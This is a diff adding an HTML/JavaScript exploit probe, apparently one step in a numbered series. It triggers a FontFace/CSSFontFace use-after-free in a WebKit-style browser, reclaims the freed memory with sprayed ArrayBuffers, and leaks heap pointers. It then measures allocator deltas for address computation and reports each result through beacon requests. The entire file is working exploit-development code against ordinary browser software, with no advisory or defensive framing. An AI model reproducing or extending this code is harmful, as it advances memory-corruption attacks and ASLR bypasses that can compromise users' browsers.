@@ -1,0 +1,198 @@
+<!--
+  p565: two-stage FontFace UAF measuring the bmalloc allocation delta between
+  consecutive WeakHashSet engine allocations and our reclaim buffer positions.
+
+  Extends p564 to collect the data needed for self-address computation:
+  the spatial relationship between leaked engine pointers and our spray ordering.
+
+  Stage 1: Free CSSFontFace, spray 16x 192B buffers, leak P1/P2, record hit index
+  Stage 2: Free second CSSFontFace, spray 16x 192B buffers, leak P1'/P2', record hit index
+
+  Key outputs per beacon:
+  - Full hex of both leaked qwords (+0x58, +0x68)
+  - Hit buffer index within our 16-buffer spray
+  - P1 mod 192 (slot alignment in size class)
+  - P1 mod 4096 (4KB page offset)
+  - Delta P1' - P1 (signed 32-bit, stride between engine allocations)
+  - Whether any stage-1 buffer was overwritten by stage-2 engine allocation
+
+  Run across multiple WebProcess relaunches (quit guide, reopen) to measure
+  whether the delta and hit indices are stable.
+
+  CRASH_CLASS: LOW — same trigger as p563/p564, no new risk
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p565 bmalloc delta</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+
+var K = 16, SIZE = 192, styleEl = null, firedHere = false, stage = 0;
+var s1result = null;
+
+function hex8(v, off) {
+  var s = '';
+  for (var i = 7; i >= 0; i--) s += ('0' + v[off + i].toString(16)).slice(-2);
+  return s;
+}
+
+function grab(v, off) {
+  var a = [];
+  for (var i = 0; i < 8; i++) a.push(v[off + i]);
+  return a;
+}
+
+function lo32(v, off) {
+  return (v[off] | (v[off+1] << 8) | (v[off+2] << 16) | ((v[off+3] << 24) >>> 0)) >>> 0;
+}
+
+function delta32(raw1, raw2) {
+  var v1 = (raw1[0] | (raw1[1] << 8) | (raw1[2] << 16) | ((raw1[3] << 24) >>> 0)) >>> 0;
+  var v2 = (raw2[0] | (raw2[1] << 8) | (raw2[2] << 16) | ((raw2[3] << 24) >>> 0)) >>> 0;
+  return (v2 - v1) | 0;
+}
+
+function setupFace(name, css) {
+  styleEl = document.createElement('style');
+  styleEl.textContent = css;
+  document.head.appendChild(styleEl);
+  var A = new FontFace(name, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive.push(A);
+}
+
+function installGetter() {
+  firedHere = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function() {
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+
+      var mapKey = '__map' + stage;
+      window[mapKey] = [];
+      for (var k = 0; k < K; k++) {
+        var ab = new ArrayBuffer(SIZE);
+        var v = new Uint8Array(ab);
+        /* unique marker at +0x10..+0x12 (engine writes refcount at +0x00,
+           pointers at +0x58/+0x68 — these offsets are ours) */
+        v[0x10] = 0xBB;
+        v[0x11] = stage & 0xFF;
+        v[0x12] = k & 0xFF;
+        window[mapKey].push(v);
+      }
+      try { document.fonts.check('1em s' + stage); } catch(e) {}
+      return undefined;
+    },
+    set: function() {}
+  });
+}
+
+function scanMap(mapKey) {
+  var m = window[mapKey] || [];
+  for (var i = 0; i < m.length; i++) {
+    var v = m[i];
+    /* engine writes a heap pointer at +0x58; our buffers have 0 there */
+    if (v[0x58] !== 0 || v[0x59] !== 0 || v[0x5A] !== 0 || v[0x5B] !== 0) {
+      var p58lo = lo32(v, 0x58);
+      return {
+        hit: i,
+        p58: hex8(v, 0x58),
+        p68: hex8(v, 0x68),
+        p58_raw: grab(v, 0x58),
+        p68_raw: grab(v, 0x68),
+        mod192: p58lo % 192,
+        mod4k:  p58lo % 4096,
+        refcount: v[0]
+      };
+    }
+  }
+  return null;
+}
+
+function start() {
+  window.__alive = [];
+  stage = 0;
+  setupFace('f0', "@font-face { font-family: s0; src: local(Arial); unicode-range: U+0042; }");
+  installGetter();
+  b('P565-SETUP');
+  document.fonts.load('1em f0, s0', 'AB').then(
+    function() { b('P565-S1-RESOLVED'); },
+    function() { b('P565-S1-REJECTED'); }
+  );
+  setTimeout(scan1, 80);
+  setTimeout(scan1, 250);
+}
+
+function scan1() {
+  if (s1result) return;
+  s1result = scanMap('__map0');
+  if (!s1result) return;
+
+  b('P565-S1-b' + s1result.hit
+    + '-p58_' + s1result.p58
+    + '-p68_' + s1result.p68
+    + '-m192_' + s1result.mod192
+    + '-m4k_' + s1result.mod4k.toString(16)
+    + '-rc_' + s1result.refcount);
+
+  /* launch stage 2 */
+  stage = 1;
+  setupFace('f1', "@font-face { font-family: s1; src: local(Arial); unicode-range: U+0043; }");
+  installGetter();
+  b('P565-S2-SETUP');
+  document.fonts.load('1em f1, s1', 'AB').then(
+    function() { b('P565-S2-RESOLVED'); },
+    function() { b('P565-S2-REJECTED'); }
+  );
+  setTimeout(scan2, 80);
+  setTimeout(scan2, 250);
+}
+
+function scan2() {
+  var s2 = scanMap('__map1');
+  if (!s2) return;
+  /* guard re-entry */
+  if (window.__s2done) return;
+  window.__s2done = true;
+
+  b('P565-S2-b' + s2.hit
+    + '-p58_' + s2.p58
+    + '-p68_' + s2.p68
+    + '-m192_' + s2.mod192
+    + '-m4k_' + s2.mod4k.toString(16)
+    + '-rc_' + s2.refcount);
+
+  /* delta between the two WeakHashSet allocations */
+  var d58 = delta32(s1result.p58_raw, s2.p58_raw);
+  var d68 = delta32(s1result.p68_raw, s2.p68_raw);
+  b('P565-DELTA-d58_' + d58 + '-d68_' + d68
+    + '-bD_' + (s2.hit - s1result.hit)
+    + '-stride_' + (d58 / (K + 1)));
+  /* d58 / (K+1) is the expected single-object stride if the K spray buffers
+     plus 1 CSSFontFace sat between the two WeakHashSet allocations */
+
+  /* check whether stage-2 engine allocation landed in a stage-1 buffer */
+  var m0 = window['__map0'] || [];
+  var ow = [];
+  for (var i = 0; i < m0.length; i++) {
+    if (i === s1result.hit) continue;
+    var v = m0[i];
+    if (v[0x10] !== 0xBB || v[0x11] !== 0 || v[0x12] !== i) {
+      var snip = '';
+      for (var j = 0; j < 8; j++) snip += ('0' + v[j].toString(16)).slice(-2);
+      ow.push('i' + i + ':' + snip);
+    }
+  }
+  b(ow.length ? 'P565-S1OW-' + ow.join('_') : 'P565-S1-INTACT-' + (m0.length - 1));
+
+  b('P565-DONE');
+}
+
+function run() { start(); }
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script></head><body><p>p565 bmalloc delta measurement</p></body></html>
